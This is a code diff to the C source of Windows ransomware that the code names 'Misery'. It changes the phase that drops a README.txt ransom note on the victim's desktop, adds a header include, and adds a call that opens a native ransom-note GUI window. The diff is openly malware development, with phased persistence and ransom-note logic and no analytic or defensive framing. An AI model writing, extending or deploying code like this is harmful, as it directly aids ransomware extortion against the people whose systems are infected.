@@ -5,6 +5,7 @@
 #include "security.h"
 #include "persistence.h"
 #include "utils.h"
+#include "ransomnote.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -256,22 +257,26 @@ static bool ExecutePhasePeristence(void) {
  * ============================================================ */
 static bool ExecutePhaseRansomNote(void) {
     MiseryLog(MISERY_LOG_INFO, "Starting RANSOM NOTE phase...");
-    
+
     bool success = true;
+
+    /* Drop text-based ransom note on desktop */
     const char *note_content = GetRansomNoteContent();
-    
-    /* Drop ransom note on desktop */
     char desktop_path[MAX_PATH];
     if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path) == S_OK) {
         char note_path[MAX_PATH * 2];
         snprintf(note_path, sizeof(note_path), "%s\\README.txt", desktop_path);
-        
+
         if (!UtilsDropRansomNote(note_path, note_content)) {
             MiseryLog(MISERY_LOG_WARN, "Failed to drop ransom note on desktop");
             success = false;
         }
     }
-    
+
+    /* Launch the native Win32 GUI window (non-blocking) */
+    MiseryLog(MISERY_LOG_INFO, "Launching ransom note GUI window...");
+    LaunchRansomNoteAsync();
+
     return MiseryPhaseTransition(PHASE_RANSOM_NOTE, success);
 }
 
